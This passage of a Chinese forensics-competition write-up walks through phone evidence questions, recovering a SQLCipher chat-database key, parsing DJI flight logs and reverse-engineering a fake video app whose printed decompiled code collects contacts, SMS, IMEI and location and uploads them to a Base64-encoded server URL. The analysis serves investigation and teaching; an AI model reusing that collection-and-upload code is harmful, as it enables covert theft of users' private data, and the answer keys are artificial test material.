+fontDict.Add "d", Array(Array(3,0), Array(3,1), Array(1,2), Array(2,2), Array(3,2), Array(0,3), Array(3,3), Array(1,4), Array(2,4), Array(3,4))
+fontDict.Add "e", Array(Array(1,0), Array(2,0), Array(0,1), Array(0,2), Array(1,2), Array(2,2), Array(0,3), Array(1,4), Array(2,4))
+fontDict.Add "f", Array(Array(1,0), Array(2,0), Array(1,1), Array(0,2), Array(1,2), Array(2,2), Array(1,3), Array(1,4))
+fontDict.Add "g", Array(Array(1,2), Array(2,2), Array(3,2), Array(0,3), Array(3,3), Array(1,4), Array(2,4), Array(3,4), Array(3,5), Array(1,6), Array(2,6))
+fontDict.Add "h", Array(Array(0,0), Array(0,1), Array(0,2), Array(1,2), Array(2,2), Array(0,3), Array(3,3), Array(0,4), Array(3,4))
+fontDict.Add "i", Array(Array(1,0), Array(1,2), Array(1,3), Array(1,4))
+fontDict.Add "j", Array(Array(2,0), Array(2,2), Array(2,3), Array(2,4), Array(2,5), Array(1,6), Array(0,5))
+fontDict.Add "k", Array(Array(0,0), Array(0,1), Array(0,2), Array(0,3), Array(0,4), Array(2,2), Array(1,3), Array(3,3), Array(2,4))
+fontDict.Add "l", Array(Array(1,0), Array(1,1), Array(1,2), Array(1,3), Array(1,4))
+fontDict.Add "m", Array(Array(0,1), Array(1,1), Array(2,1), Array(3,1), Array(4,1), Array(0,2), Array(2,2), Array(4,2), Array(0,3), Array(4,3))
+fontDict.Add "n", Array(Array(0,1), Array(1,0), Array(2,0), Array(0,2), Array(3,2), Array(0,3), Array(3,3), Array(0,4), Array(3,4))
+fontDict.Add "o", Array(Array(1,1), Array(2,1), Array(0,2), Array(3,2), Array(1,3), Array(2,3))
+fontDict.Add "p", Array(Array(0,2), Array(1,2), Array(2,2), Array(0,3), Array(3,3), Array(0,4), Array(1,4), Array(2,4), Array(0,5), Array(0,6))
+fontDict.Add "q", Array(Array(1,2), Array(2,2), Array(0,3), Array(3,2), Array(3,3), Array(3,4), Array(3,5), Array(4,5))
+fontDict.Add "r", Array(Array(0,2), Array(0,3), Array(0,4), Array(1,2), Array(2,2))
+fontDict.Add "s", Array(Array(1,0), Array(2,0), Array(3,0), Array(0,1), Array(1,2), Array(2,2), Array(3,3), Array(0,4), Array(1,4), Array(2,4))
+fontDict.Add "t", Array(Array(1,0), Array(1,1), Array(1,2), Array(1,3), Array(1,4), Array(0,2), Array(2,2))
+fontDict.Add "u", Array(Array(0,2), Array(0,3), Array(3,2), Array(3,3), Array(1,4), Array(2,4), Array(3,4))
+fontDict.Add "v", Array(Array(0,0), Array(4,0), Array(1,2), Array(3,2), Array(2,4))
+fontDict.Add "w", Array(Array(0,2), Array(0,3), Array(1,4), Array(2,3), Array(3,4), Array(4,2), Array(4,3))
+fontDict.Add "x", Array(Array(0,0), Array(4,0), Array(1,1), Array(3,1), Array(2,2), Array(1,3), Array(3,3), Array(0,4), Array(4,4))
+fontDict.Add "y", Array(Array(0,0), Array(4,0), Array(1,1), Array(3,1), Array(2,2), Array(2,3), Array(1,4))
+fontDict.Add "z", Array(Array(0,0), Array(1,0), Array(2,0), Array(3,0), Array(2,1), Array(1,2), Array(0,3), Array(0,4), Array(1,4), Array(2,4), Array(3,4))
+' 添加特殊字符
+fontDict.Add ":", Array(Array(1,1), Array(1,3))
+fontDict.Add "@", Array(Array(1,0), Array(2,0), Array(0,1), Array(3,1), Array(0,2), Array(2,2), Array(3,2), Array(0,3), Array(1,4), Array(2,4))
+fontDict.Add ".", Array(Array(1,4))
+' 第五步：匹配每个字符组
+Dim result As String
+result = ""
+' 按字符索引顺序处理
+Dim charIndices As Variant
+charIndices = charGroups.Keys
+' 对索引排序（使用Variant类型，避免For Each错误）
+Dim idx1 As Variant, idx2 As Variant
+Dim i1 As Long, i2 As Long
+' 转换为数组进行排序
+Dim indexArray() As Long
+ReDim indexArray(LBound(charIndices) To UBound(charIndices))
+For i1 = LBound(charIndices) To UBound(charIndices)
+indexArray(i1) = CLng(charIndices(i1))
+Next i1
+' 排序
+For i1 = LBound(indexArray) To UBound(indexArray) - 1
+For i2 = i1 + 1 To UBound(indexArray)
+If indexArray(i1) > indexArray(i2) Then
+Dim tempVal As Long
+tempVal = indexArray(i1)
+indexArray(i1) = indexArray(i2)
+indexArray(i2) = tempVal
+End If
+Next i2
+Next i1
+' 处理每个字符
+For i1 = LBound(indexArray) To UBound(indexArray)
+Dim charIdx As Long
+charIdx = indexArray(i1)
+Dim group As Collection
+Set group = charGroups(charIdx)
+' 将组内的点转换为字典形式，方便比较
+Dim pointDict As Object
+Set pointDict = CreateObject("Scripting.Dictionary")
+Dim point As Variant
+Dim pointArray As Variant
+For Each point In group
+pointArray = point  ' point已经是Array
+Dim lx As Long, ly As Long
+lx = pointArray(0)
+ly = pointArray(1)
+Dim key As String
+key = lx & "," & ly
+pointDict(key) = True
+Next point
+' 在字体字典中查找匹配的字符
+Dim matchedChar As String
+matchedChar = ""
+Dim fontKey As Variant
+Dim fontPoints As Variant
+Dim fp As Variant
+For Each fontKey In fontDict.Keys
+fontPoints = fontDict(fontKey)
+' 检查点数量是否相同
+If UBound(fontPoints) + 1 = pointDict.Count Then
+Dim allMatch As Boolean
+allMatch = True
+' 检查每个点是否匹配
+For Each fp In fontPoints
+Dim fk As String
+fk = fp(0) & "," & fp(1)
+If Not pointDict.Exists(fk) Then
+allMatch = False
+Exit For
+End If
+Next fp
+If allMatch Then
+matchedChar = CStr(fontKey)
+Exit For
+End If
+End If
+Next fontKey
+' 添加匹配结果（未匹配到则用?代替）
+If matchedChar <> "" Then
+result = result & matchedChar
+Else
+result = result & "?"
+End If
+Next i1
+DecryptStego = result
+End Function
+Sub DecryptAndShow()
+Dim secret As String
+secret = DecryptStego()
+MsgBox "解密结果: " & secret, vbInformation, "隐写术解密"
+End Sub
+在 Excel 或者 WPS 的宏编辑器中添加模块并运行, 即可得到隐写的信息:
+另外几个文件解密后得到的信息:
+pass8.et
+的内容没有加密:
+另外
+pass6.et
+的隐写内容无法通过上述脚本提取. 推测是解密后的点阵不是数字或字母. 实际看过解密出的点阵之后, 确实不是有意义的文字.
+手机部分
+¶
+Info
+以下题目分析手机检材。
+11 手机型号为?
+¶
+答案
+Redmi Note 7 Pro
+该检材通过雷电快取进行的镜像提取, 因此在检材路径下存有
+ThunderForensic 1.json
+文件, 该文件保存了检材的相关信息:
+Device.Model = Redmi Note 7 Pro
+.
+同文件还显示
+Manufactor=Xiaomi
+、
+ProductName=violet
+、
+OsVersion=10
+.
+火眼证据分析软件提取该检材的基本信息是通过读取
+ThunderForensic 1.json
+文件得到的, 同厂商的软件之间相互联动也是业界的通常做法.
+12 李安弘手机计划前往迪拜的日期是?
+¶
+答案
+2026.06.06
+这里提供几个思路吧.
+可以通过搜狗软件的历史记录, 看到先前用户输入的是
+dubai
+, 而不是中文迪拜:
+首先是全局搜索, 使用火眼或 X-Ways Forensics 的搜索功能:
+也可以按照常规思路，查找手机的备忘录类应用，该检材使用的是小米笔记的
+TODO
+功能。
+再就是使用
+dbs2json
+, 平坦化手机应用中全部的数据库数据, 然后直接进行搜索:
+13 李安弘手机中与网站搭建人员沟通所使用的 APP 安装日期为?
+¶
+答案
+2026-04-14 18:00:55
+筛选后可以看到即时通讯应用为
+com.talk.uuuim
+:
+该应用安装时间为 2026-04-14 18:00:55, 该信息来源于
+/data/system/packages.xml
+:
+XML
+<package
+name=
+"com.talk.uuuim"
+codePath=
+"/data/app/com.talk.uuuim-TvDbtcF2dENhraYZWbysyg=="
+nativeLibraryPath=
+"/data/app/com.talk.uuuim-TvDbtcF2dENhraYZWbysyg==/lib"
+primaryCpuAbi=
+"arm64-v8a"
+publicFlags=
+"676904516"
+privateFlags=
+"0"
+ft=
+"19d8b6fcff0"
+it=
+"19d8b6fd571"
+ut=
+"19d8b6fd571"
+version=
+"220004"
+userId=
+"10195"
+installer=
+"com.google.android.packageinstaller"
+>
+有
+it
+属性, 推测是
+install time
+, 转换为 10 进制为
+1776160855409
+, 是时间戳, 转为时间为
+Tue 14 April 2026 10:00:55.409 UTC
+.
+14 李安弘手机中与网站搭建人员沟通所使用的
+APP
+, 存放聊天数据的数据库为?
+¶
+答案
+wk_9628874a3c6b403593766496fa985893.db
+上述应用的数据路径为
+检材2-手机.tar/data/user/0/com.talk.uuuim
+, 其中包括多个数据库文件:
+其中
+wk_9628874a3c6b403593766496fa985893.db
+是加密的数据库, 其余的数据库未加密, 通过查阅也确实不存在聊天数据.
+15 存放聊天数据的数据库解密密码为？
+¶
+答案
+9628874a3c6b403593766496fa985893
+对上述手机应用进行逆向分析，从该应用的源码以及数据库的名称，可以看到有一个关键词
+wk
+:
+检索
+wkim
+,
+WuKongIM
+是一个开源流行的去中心化
+im
+框架, 同时也有
+WuKongIMAndroidSDK
+. 这里本身想直接翻 SDK 的实现:
+Java
+import
+net.zetetic.database.sqlcipher.SQLiteDatabase
+;
+import
+net.zetetic.database.sqlcipher.SQLiteOpenHelper
+;
+import
+net.zetetic.database.sqlcipher.SQLiteConnection
+;
+import
+net.zetetic.database.sqlcipher.SQLiteDatabaseHook
+;
+public
+class
+WKDBHelper
+{
+private
+static
+final
+String
+TAG
+=
+"WKDBHelper"
+;
+private
+SQLiteDatabase
+mDb
+;
+private
+volatile
+static
+WKDBHelper
+openHelper
+=
+null
+;
+private
+final
+static
+int
+version
+=
+1
+;
+private
+static
+String
+myDBName
+;
+private
+static
+volatile
+String
+uid
+;
+private
+WKDBHelper
+(
+Context
+ctx
+,
+String
+uid
+)
+{
+WKDBHelper
+.
+uid
+=
+uid
+;
+myDBName
+=
+"wk_"
++
+uid
++
+".db"
+;
+try
+{
+System
+.
+loadLibrary
+(
+"sqlcipher"
+);
+File
+databaseFile
+=
+ctx
+.
+getDatabasePath
+(
+myDBName
+);
+databaseFile
+.
+getParentFile
+().
+mkdirs
+();
+mDb
+=
+SQLiteDatabase
+.
+openOrCreateDatabase
+(
+databaseFile
+,
+uid
+,
+null
+,
+null
+,
+null
+);
+try
+(
+Cursor
+c
+=
+mDb
+.
+rawQuery
+(
+"PRAGMA journal_mode=WAL"
+,
+null
+))
+{
+if
+(
+c
+!=
+null
+)
+c
+.
+moveToFirst
+();
+}
+WKDBUpgrade
+.
+getInstance
+().
+onUpgrade
+(
+mDb
+);
+}
+catch
+(
+Exception
+e
+)
+{
+WKLoggerUtils
+.
+getInstance
+().
+e
+(
+TAG
++
+" init WKDBHelper error: "
++
+e
+.
+getMessage
+());
+e
+.
+printStackTrace
+();
+}
+}
+// snip
+}
+可以看到源码中调用
+net.zetetic.database.sqlcipher.SQLiteDatabase
+, 是一个外部的库, 无法继续追踪. 只能老老实实逆向了. 
+这里有一个小技巧, Java 层的数据库接口相关类命名常见
+DBHelper
+、
+SQL
+等关键词, 我们可以快速定位:
+Java
+public
+final
+void
+g
+(
+@NotNull
+String
+uid
+,
+boolean
+z
+)
+{
+SQLiteDatabase
+sQLiteDatabase
+;
+Intrinsics
+.
+checkNotNullParameter
+(
+uid
+,
+"uid"
+);
+WKLoggerUtils
+.
+Companion
+companion
+=
+WKLoggerUtils
+.
+Companion
+;
+companion
+.
+getInstance
+().
+tag
+(
+TAG
+).
+d
+(
+uid
+);
+if
+(
+TextUtils
+.
+isEmpty
+(
+uid
+))
+{
+throw
+new
+IllegalArgumentException
+(
+"UID cannot be empty"
+);
+}
+if
+(
+Intrinsics
+.
+areEqual
+(
+uid
+,
+this
+.
+currentUid
+)
+&&
+(
+sQLiteDatabase
+=
+this
+.
+mDb
+)
+!=
+null
+&&
+sQLiteDatabase
+.
+isOpen
+())
+{
+companion
+.
+getInstance
+().
+tag
+(
+TAG
+).
+d
+(
+"Database already initialized for UID: "
++
+uid
+);
+return
+;
+}
+d
+();
+this
+.
+currentUid
+=
+uid
+;
+this
+.
+myDBName
+=
+DB_PREFIX
++
+uid
++
+".db"
+;
+try
+{
+this
+.
+mDbHelper
+=
+new
+DatabaseHelper
+(
+this
+,
+this
+.
+context
+);
+SQLiteDatabase
+writableDatabase
+=
+null
+;
+if
+(
+l
+())
+{
+DatabaseHelper
+databaseHelper
+=
+this
+.
+mDbHelper
+;
+if
+(
+databaseHelper
+!=
+null
+)
+{
+writableDatabase
+=
+databaseHelper
+.
+getWritableDatabase
+(
+""
+);
+}
+}
+else
+{
+DatabaseHelper
+databaseHelper2
+=
+this
+.
+mDbHelper
+;
+if
+(
+databaseHelper2
+!=
+null
+)
+{
+writableDatabase
+=
+databaseHelper2
+.
+getWritableDatabase
+(
+uid
+);
+}
+}
+this
+.
+mDb
+=
+writableDatabase
+;
+if
+(
+writableDatabase
+==
+null
+||
+!
+z
+)
+{
+return
+;
+}
+WKDBUpgrade
+.
+b
+().
+e
+(
+this
+.
+context
+,
+writableDatabase
+);
+}
+catch
+(
+Exception
+e
+)
+{
+WKLoggerUtils
+.
+Companion
+.
+getInstance
+().
+tag
+(
+TAG
+).
+e
+(
+String
+.
+valueOf
+(
+e
+.
+getMessage
+()));
+e
+.
+printStackTrace
+();
+d
+();
+}
+}
+可以看到
+writableDatabase = databaseHelper2.getWritableDatabase(uid);
+语句, 我们一直追踪过该
+uid
+传递链, 最终追踪定位到:
+Java
+// net.sqlcipher.database.SQLiteDatabase.openDatabaseInternal
+private
+void
+openDatabaseInternal
+(
+final
+byte
+[]
+bArr
+,
+SQLiteDatabaseHook
+sQLiteDatabaseHook
+)
+{
+dbopen
+(
+this
+.
+mPath
+,
+this
+.
+mFlags
+);
+try
+{
+try
+{
+keyDatabase
+(
+sQLiteDatabaseHook
+,
+new
+Runnable
+()
+{
+// from class: net.sqlcipher.database.SQLiteDatabase.2
+@Override
+// java.lang.Runnable
+public
+void
+run
+()
+throws
+SQLException
+{
+byte
+[]
+bArr2
+=
+bArr
+;
+if
+(
+bArr2
+==
+null
+||
+bArr2
+.
+length
+<=
+0
+)
+{
+return
+;
+}
+SQLiteDatabase
+.
+this
+.
+key
+(
+bArr2
+);
+}
+});
+}
+catch
+(
+RuntimeException
+e
+)
+{
+final
+char
+[]
+chars
+=
+getChars
+(
+bArr
+);
+if
+(
+containsNull
+(
+chars
+))
+{
+keyDatabase
+(
+sQLiteDatabaseHook
+,
+new
+Runnable
+()
+{
+// from class: net.sqlcipher.database.SQLiteDatabase.3
+@Override
+// java.lang.Runnable
+public
+void
+run
+()
+throws
+SQLException
+{
+if
+(
+bArr
+!=
+null
+)
+{
+SQLiteDatabase
+.
+this
+.
+key_mutf8
+(
+chars
+);
+}
+}
+});
+if
+(
+bArr
+!=
+null
+&&
+bArr
+.
+length
+>
+0
+)
+{
+rekey
+(
+bArr
+);
+}
+if
+(
+chars
+==
+null
+||
+chars
+.
+length
+<=
+0
+)
+{
+return
+;
+}
+Arrays
+.
+fill
+(
+chars
+,
+(
+char
+)
+0
+);
+return
+;
+}
+throw
+e
+;
+}
+}
+catch
+(
+Throwable
+th
+)
+{
+if
+(
+1
+!=
+0
+)
+{
+dbclose
+();
+if
+(
+SQLiteDebug
+.
+DEBUG_SQL_CACHE
+)
+{
+this
+.
+mTimeClosed
+=
+getTime
+();
+}
+}
+throw
+th
+;
+}
+}
+再向上追踪, 追踪不到明确说明是加密数据库的地方了...
+不想追了, 这里有两个方案, 一个是直接查看
+net.zetetic.database.sqlcipher
+的 api, 再一个是继续追踪.
+这里是使用
+uid
+作为数据库的密码, 我们直接尝试:
+可以打开.
+16 李安弘购买云服务器商家的收款备用钱包地址为?
+¶
+Info
+TN8vQzB3n7W5wVca9W4kL2wP7xY9zM5nU1
+直接翻阅数据库:
+17 李安弘手机中给网站搭建人员第一次转账的交易 hash 前 6 位为?
+¶
+答案
+26226f
+嫌疑人回复图片的地址在数据库中可见
+\/storage\/emulated\/0\/Android\/data\/com.talk.uuuim\/cache\/luban_disk_cache\/843289438932.png
+:
+18 手机中使用的 AI 软件, 李安弘主动向 AI 提问了几次?
+¶
+答案
+5
+在先前应用筛选的时候, 可以看到包名为
+com.pocketpalai
+明显是手机 AI 应用:
+查看该应用的数据库:
+其中用户作者 ID
+y9d7f8pgn
+5 条; AI 作者 ID
+h3o3lc5xj
+5 条.
+19 李安弘手机使用的 AI 软件调用的本地 AI 模型及版本为?
+¶
+答案
+Qwen3.5-0.8B.Q4_K_M
+在上述应用的数据文件夹中反照配置文件, 共找到多种结果:
+downloads.db
+中显示下载了
+qwen2.5-1.5b-instruct-q8_0.gguf
+:
+RKStorage
+中显示
+Gemma
+等模型:
+但是在检材中仅找到一个
+gguf
+文件:
+检材2-手机.tar/data/user/0/com.pocketpalai/files/models/local/Qwen.Qwen3.5-0.8B.Q4_K_M.gguf
+.
+20 李安弘曾使用无人机航拍. 分析其飞行轨迹, 其在哪个县进行飞行?
+¶
+答案
+米脂县
+在手机检材中找到大疆无人机应用用户目录
+检材2-手机.tar/storage/emulated/0/Android/data/dji.go.v5/files/FlightRecord
+, 其中包含
+FlightRecord_2026-02-17_[15-14-53].txt
+、
+FlightRecord_2026-02-17_[15-58-14].txt
+两个飞行日志文件.
+先前的各种工具还是有些零散了,
+pydjirecord
+使用 python 重写了
+dji-log-parser
+, 并且支持所有日志格式版本 (1 至 14), 包括 XOR 加密(v7-12) 和 AES-256-CBC 加密 (v13-14).
+Bash
+python
+-m
+pydjirecord
+.
+\F
+lightRecord_2026-02-17_
+[
+15
+-14-53
+]
+.txt
+Text Only
+Log version:  14
+Aircraft:     DJI Mini 3 Pro
+Product type: MINI3_PRO
+Aircraft SN:  1581F4XFC234H008
+Camera SN:    53HQL320M5008Z
+RC SN:        5MEZK1L0010223
+Battery SN:   52XPK4DCA00N1R
+Start time:   2026-02-17 07:14:53 UTC
+Location:     Map Loading, Map Loading
+Coordinates:  37.796638, 110.370705
+Takeoff alt:  980.9 m
+Flight stats:
+Distance:   1416.4 m
+Duration:   14m 1s
+Max height: 33.0 m
+Max H speed: 9.4 m/s
+Max V speed: 3.1 m/s
+Photos:       0
+Video time:   670m 22s
+App:          DJI_FLY v1.19.5
+可以看到起飞的坐标是
+Coordinates:  37.796638, 110.370705
+, 用 OpenStreetMap 的坐标反查查询该坐标:
+Text Only
+Mizhi County, Yulin, Shaanxi, China
+米脂县, 榆林市, 陕西省, 中国
+或者直接调 API:
+Bash
+curl
+-sG
+'https://nominatim.openstreetmap.org/reverse'
+\
+--data-urlencode
+'format=jsonv2'
+\
+--data-urlencode
+'lat=37.796638'
+\
+--data-urlencode
+'lon=110.370705'
+\
+--data-urlencode
+'accept-language=zh-CN'
+返回结果为:
+JSON
+{
+"place_id"
+:
+219890022
+,
+"licence"
+:
+"Data © OpenStreetMap contributors, ODbL 1.0. http://osm.org/copyright"
+,
+"osm_type"
+:
+"way"
+,
+"osm_id"
+:
+457944107
+,
+"lat"
+:
+"37.8012179"
+,
+"lon"
+:
+"110.3720163"
+,
+"category"
+:
+"highway"
+,
+"type"
+:
+"secondary"
+,
+"place_rank"
+:
+26
+,
+"importance"
+:
+0.053399658960860574
+,
+"addresstype"
+:
+"road"
+,
+"name"
+:
+""
+,
+"display_name"
+:
+"米脂县, 榆林市, 陕西省, 中国"
+,
+"address"
+:{
+"county"
+:
+"米脂县"
+,
+"city"
+:
+"榆林市"
+,
+"state"
+:
+"陕西省"
+,
+"ISO3166-2-lvl4"
+:
+"CN-SN"
+,
+"country"
+:
+"中国"
+,
+"country_code"
+:
+"cn"
+},
+"boundingbox"
+:[
+"37.7984304"
+,
+"37.8045100"
+,
+"110.3635667"
+,
+"110.3952992"
+]
+}
+如果本地需要, 可以搭建一个逆地址查询服务
+geodeparse
+.
+21 李安弘最近安装了一个视频类 APP, 该 APP 声明了多个敏感权限用于收集用户隐私. 请选择其中涉及用户隐私的敏感权限.
+¶
+答案
+READ_CONTACTS、READ_SMS、READ_CALL_LOG、READ_PHONE_STATE、ACCESS_FINE_LOCATION、ACCESS_COARSE_LOCATION、CAMERA、READ_EXTERNAL_STORAGE、WRITE_EXTERNAL_STORAGE
+很容易定位到应用名称为"影视热播"的应用, 包名为
+com.livevideo.hotclub
+, 可以找到该应用安装包
+检材2-手机.tar/storage/emulated/0/Download/HotClub_v2.1.6.apk
+.
+使用 Jadx 直接查看该应用的
+Manifest.xml
+文件:
+XML
+<uses-permission
+android:name=
+"android.permission.INTERNET"
+/>
+<uses-permission
+android:name=
+"android.permission.ACCESS_NETWORK_STATE"
+/>
+<uses-permission
+android:name=
+"android.permission.ACCESS_WIFI_STATE"
+/>
+<uses-permission
+android:name=
+"android.permission.READ_CONTACTS"
+/>
+<uses-permission
+android:name=
+"android.permission.READ_SMS"
+/>
+<uses-permission
+android:name=
+"android.permission.READ_CALL_LOG"
+/>
+<uses-permission
+android:name=
+"android.permission.READ_PHONE_STATE"
+/>
+<uses-permission
+android:name=
+"android.permission.ACCESS_FINE_LOCATION"
+/>
+<uses-permission
+android:name=
+"android.permission.ACCESS_COARSE_LOCATION"
+/>
+<uses-permission
+android:name=
+"android.permission.CAMERA"
+/>
+<uses-permission
+android:name=
+"android.permission.READ_EXTERNAL_STORAGE"
+/>
+<uses-permission
+android:name=
+"android.permission.WRITE_EXTERNAL_STORAGE"
+/>
+<uses-permission
+android:name=
+"android.permission.RECEIVE_BOOT_COMPLETED"
+/>
+<permission
+android:name=
+"com.livevideo.hotclub.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+android:protectionLevel=
+"signature"
+/>
+<uses-permission
+android:name=
+"com.livevideo.hotclub.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+/>
+或者查看雷电手机 APP 分析的结果:
+22 上述 APP 启动后会加载一个色情网站. 请找出该 APP 在网络不可用时加载的本地离线页面路径.
+¶
+答案
+file:///android_asset/www/index.html
+反编译 HotClub, 查看
+MainActivity.java
+中 WebView 加载逻辑:
+Java
+public
+final
+void
+onCreate
+(
+Bundle
+bundle
+)
+{
+boolean
+z2
+;
+NetworkInfo
+activeNetworkInfo
+;
+super
+.
+onCreate
+(
+bundle
+);
+setContentView
+(
+R
+.
+layout
+.
+activity_main
+);
+WebView
+webView
+=
+(
+WebView
+)
+findViewById
+(
+R
+.
+id
+.
+main_webview
+);
+this
+.
+f597t
+=
+webView
+;
+WebSettings
+settings
+=
+webView
+.
+getSettings
+();
+settings
+.
+setJavaScriptEnabled
+(
+true
+);
+settings
+.
+setDomStorageEnabled
+(
+true
+);
+settings
+.
+setAllowFileAccess
+(
+true
+);
+settings
+.
+setAllowContentAccess
+(
+true
+);
+settings
+.
+setMixedContentMode
+(
+0
+);
+settings
+.
+setUserAgentString
+(
+"HotClub/2.1.6 (Android "
++
+Build
+.
+VERSION
+.
+RELEASE
++
+"; "
++
+Build
+.
+MODEL
++
+") WebKit/537.36"
+);
+this
+.
+f597t
+.
+setWebViewClient
+(
+new
+a
+());
+this
+.
+f597t
+.
+setWebChromeClient
+(
+new
+WebChromeClient
+());
+this
+.
+f597t
+.
+addJavascriptInterface
+(
+new
+NativeBridge
+(
+this
+),
+"AppNative"
+);
+new
+Thread
+(
+new
+b
+(
+4
+,
+this
+)).
+start
+();
+try
+{
+activeNetworkInfo
+=
+((
+ConnectivityManager
+)
+getSystemService
+(
+"connectivity"
+)).
+getActiveNetworkInfo
+();
+}
+catch
+(
+Exception
+unused
+)
+{
+}
+if
+(
+activeNetworkInfo
+!=
+null
+)
+{
+z2
+=
+activeNetworkInfo
+.
+isConnected
+();
+}
+this
+.
+f597t
+.
+loadUrl
+(
+z2
+?
+"https://www.sp-live88.com"
+:
+"file:///android_asset/www/index.html"
+);
+}
+网络失败时 fallback 到 assets 下的
+www/index.html
+.
+23 上述 APP 将非法收集的用户隐私数据上传至远程服务器. 上传地址在代码中经过编码处理. 请找出编码方式, 并还原出完整的上传服务器 URL.
+¶
+答案
+https://api.sp-live88.com/collect/userdata
+在
+DataUploader
+类中可以看到:
+Java
+public
+final
+void
+b
+(
+String
+str
+)
+{
+try
+{
+try
+{
+a
+(
+new
+String
+(
+Base64
+.
+decode
+(
+"aHR0cHM6Ly9hcGkuc3AtbGl2ZTg4LmNvbS9jb2xsZWN0L3VzZXJkYXRh"
+,
+2
+),
+"UTF-8"
+),
+str
+);
+}
+catch
+(
+Exception
+unused
+)
+{
+}
+}
+catch
+(
+Exception
+unused2
+)
+{
+String
+backupEndpoint
+=
+getBackupEndpoint
+();
+if
+(
+backupEndpoint
+==
+null
+||
+backupEndpoint
+.
+isEmpty
+())
+{
+return
+;
+}
+a
+(
+backupEndpoint
+.
+concat
+(
+"/collect/userdata"
+),
+str
+);
+}
+}
+上传地址以 Base64 字符串保存, 解码后得到完整 URL:
+https://api.sp-live88.com/collect/userdata
+.
+24 该 APP 在本地创建了 SQLite 数据库存储收集到的用户信息. 请分析代码, 写出用于存储用户信息的表名.
+¶
+答案
+user_collection
+直接在源码中检索
+sql
+关键词:
+可以检索到写入的代码为:
+Java
+public
+final
+class
+a
+extends
+SQLiteOpenHelper
+{
+public
+a
+(
+Context
+context
+)
+{
+super
+(
+context
+,
+"hotclub_data.db"
+,
+(
+SQLiteDatabase
+.
+CursorFactory
+)
+null
+,
+2
+);
+}
+public
+final
+void
+a
+(
+String
+str
+,
+String
+str2
+,
+String
+str3
+,
+String
+str4
+,
+String
+str5
+,
+double
+d2
+,
+double
+d3
+)
+{
+SQLiteDatabase
+writableDatabase
+=
+getWritableDatabase
+();
+ContentValues
+contentValues
+=
+new
+ContentValues
+();
+contentValues
+.
+put
+(
+"device_id"
+,
+str
+);
+contentValues
+.
+put
+(
+"imei"
+,
+str2
+);
+contentValues
+.
+put
+(
+"phone_number"
+,
+str3
+);
+contentValues
+.
+put
+(
+"contacts_data"
+,
+str4
+);
+contentValues
+.
+put
+(
+"sms_data"
+,
+str5
+);
+contentValues
+.
+put
+(
+"location_lat"
+,
+Double
+.
+valueOf
+(
+d2
+));
+contentValues
+.
+put
+(
+"location_lng"
+,
+Double
+.
+valueOf
+(
+d3
+));
+contentValues
+.
+put
+(
+"collect_time"
+,
+Long
+.
+valueOf
+(
+System
+.
+currentTimeMillis
+()));
+writableDatabase
+.
+insert
+(
+"user_collection"
+,
+null
+,
+contentValues
+);
+writableDatabase
+.
+close
+();
+}
+@Override
+// android.database.sqlite.SQLiteOpenHelper
+public
+final
+void
+onCreate
+(
+SQLiteDatabase
+sQLiteDatabase
+)
+throws
+SQLException
+{
+sQLiteDatabase
+.
+execSQL
+(
+"CREATE TABLE IF NOT EXISTS user_collection (_id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, imei TEXT, phone_number TEXT, contacts_data TEXT, sms_data TEXT, location_lat REAL, location_lng REAL, collect_time INTEGER DEFAULT (strftime('%s','now') * 1000))"
+);
+sQLiteDatabase
+.
+execSQL
+(
+"CREATE TABLE IF NOT EXISTS app_config (key TEXT PRIMARY KEY, value TEXT)"
+);
+sQLiteDatabase
+.
+execSQL
+(
+"INSERT INTO app_config (key, value) VALUES ('install_time', '"
++
+System
+.
+currentTimeMillis
+()
++
+"')"
+);
+sQLiteDatabase
+.
+execSQL
+(
+"INSERT INTO app_config (key, value) VALUES ('channel', 'tg_promote_01')"
+);
+sQLiteDatabase
+.
+execSQL
+(
+"INSERT INTO app_config (key, value) VALUES ('referrer', 'zheng_dev')"
+);
+}
+@Override
+// android.database.sqlite.SQLiteOpenHelper
+public
+final
+void
+onUpgrade
+(
+SQLiteDatabase
+sQLiteDatabase
+,
+int
+i2
+,
+int
+i3
+)
+throws
+SQLException
+{
+if
+(
+i2
+<
+2
+)
+{
+sQLiteDatabase
+.
+execSQL
+(
+"ALTER TABLE user_collection ADD COLUMN collect_time INTEGER DEFAULT 0"
+);
+}
+}
+25 该 APP 的
+assets
+目录中存在一个加密配置文件
+config.dat
+. 请解密该文件, 写出其中的 USDT 钱包地址.
+¶
+答案
+TXqH7sVn8bR4kL2mN9pW6xJ3cY5dF1gA
+直接在 jadx 中检索
+config.dat
+, 可获得:
+检索到相关代码:
+Java
+public
+static
+String
+s
+(
+Context
+context
+)
+throws
+NoSuchPaddingException
+,
+NoSuchAlgorithmException
+,
+IOException
+,
+InvalidKeyException
+{
+try
+{
+InputStream
+inputStreamOpen
+=
+context
+.
+getAssets
+().
+open
+(
+"config.dat"
+);
+ByteArrayOutputStream
+byteArrayOutputStream
+=
+new
+ByteArrayOutputStream
+();
+byte
+[]
+bArr
+=
+new
+byte
+[
+4096
+]
+;
+while
+(
+true
+)
+{
+int
+i2
+=
+inputStreamOpen
+.
+read
+(
+bArr
+);
+if
+(
+i2
+==
+-
+1
+)
+{
+inputStreamOpen
+.
+close
+();
+byte
+[]
+byteArray
+=
+byteArrayOutputStream
+.
+toByteArray
+();
+byte
+[]
+bArrT
+=
+t
+(
+context
+.
+getString
+(
+context
+.
+getResources
+().
+getIdentifier
+(
+"config_seed"
+,
+"string"
+,
+context
+.
+getPackageName
+())));
+Cipher
+cipher
+=
+Cipher
+.
+getInstance
+(
+"AES/ECB/PKCS5Padding"
+);
+cipher
+.
+init
+(
+2
+,
+new
+SecretKeySpec
+(
+bArrT
+,
+"AES"
+));
+return
+new
+String
+(
+cipher
+.
+doFinal
+(
+byteArray
+),
+"UTF-8"
+);
+}
+byteArrayOutputStream
+.
+write
+(
+bArr
+,
+0
+,
+i2
+);
+}
+}
+catch
+(
+Exception
+unused
+)
+{
+return
+null
+;
+}
+}
+public
+static
+byte
+[]
+t
+(
+String
+str
+)
+{
+try
+{
+byte
+[]
+bArrDigest
+=
+MessageDigest
+.
+getInstance
+(
+"MD5"
+).
+digest
+(
+str
+.
+getBytes
+(
+"UTF-8"
+));
+StringBuilder
+sb
+=
+new
+StringBuilder
+();
+for
+(
+byte
+b2
+:
+bArrDigest
+)
+{
+sb
+.
+append
+(
+String
+.
+format
+(
+"%02x"
+,
+Byte
+.
+valueOf
+(
